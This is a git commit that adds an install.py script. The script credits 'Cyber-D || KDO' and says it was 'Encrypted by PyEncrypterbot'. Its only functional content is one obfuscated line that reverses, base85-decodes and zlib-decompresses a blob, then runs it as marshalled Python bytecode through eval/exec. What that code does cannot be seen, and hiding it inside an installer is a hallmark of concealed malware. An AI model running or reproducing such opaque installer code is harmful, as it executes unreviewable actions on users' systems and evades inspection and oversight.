074bc98b389a1dfc3b38389b4334a4a28435553a
Cyber DK <129024653+dk1285@users.noreply.github.com>
2024-02-05 22:11:15 +0530

    Add files via upload

---
+++ install.py
@@ -0,0 +1,9 @@
+
+#   Encrypted by PyEncrypterbot
+
+#   Developer Cyber-D || KDO
+#   instagram: https://instagram.com/cyber_d_kdo
+#   Team Instagram: https://instagram.com/cyber_d_army
+#   Bot link: https://t.me/PyEncrypterbot
+
+_1nf3r10r_ = lambda __1nf3r10r__ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(__1nf3r10r__[::-1])));eval("exec((_1nf3r10r_)(b'Dc^T%k7%e{1u1HL~zcobs8Vf1|TXIO_8PLM>V<AW7J$mt}n#qP=yL&$N2+CAfQ_$(ETje`s&!WsgMSr#?9NPmkLh=<xrHx&qtupdblB-COjv<@)gwWrM9y!NvB(1WGSyQpMnVuzr8r$6jN%oNU1O|xwrJ-y##aQ%CX_P&1v>4sh2rxboU@&K+*9&HO#yDYkid~XNDWwXG2$2HVO5k4sMhcr4gZGDBE(2-RZK}Y|!d}VDBd7MYh3s_U6^_P5QA<;soD$OR1l}2!#r)sV(BM0W3++<-z=QtW`Rthb#9!JT)qg$6r3Yn}!MZ)NAFT)Wtl4u&|s)r1LD-&hA}*U|;<mpvz^<^0R?^YB5`X{~3RRE~fZc`F~ZQhk*NT;MetzA4n-$ISGuw^RZ!jZPcS}_9nrjy1#1ogEPNOP#<*aWv$(Z-AHvm(M^3vg9iyN9AG{-M9tohY=eyceVL_Qy0qBU>7jF~U4aP1Fc&%j@2ajo`><iCjNmn06U9;mz>+`Q(D?}ILJVMYki=Ygl_x$){i4>#AO0Pgfx`i7b2c;#g#SD(6FhQBH%vtgC~C1}%KsZttKQV>q#@;$gd_#K9K?IX(2|3*Z^kv+Q@bYB`wkJ#dqz%kRNrY;#Y$Uv<14E<^@KwF9H<H#!or*i;kCL8OMh1?O_PjgMPpMQeeun|<5cQZxH6xZQl||UY_F{KnrtX8iTdZ8C4U-5%5O>J@3c<ogpmHl0Vqjgyx`Lm@4;(}Y5PwJd4`F(u4o@OB0Qb9R(b3FtGQbicRcXI!1FUWg<Jy62PVDPGw+B(EXOBPB}p03w;m}2RjLndVIrWMrnwx!xTM(IGvxl}{O)QseKpenZZ43dV?&E#XEx(DWheY&==P#Wti1VqeuByh%Q1gG6ScfkneBDE53#Xda`=Dk_jsk@-U?q9SU;}s`1#vVboKJBpgf9j<)-5db*0myEX7v-*f{700Q3f4Y<K^$c'))")
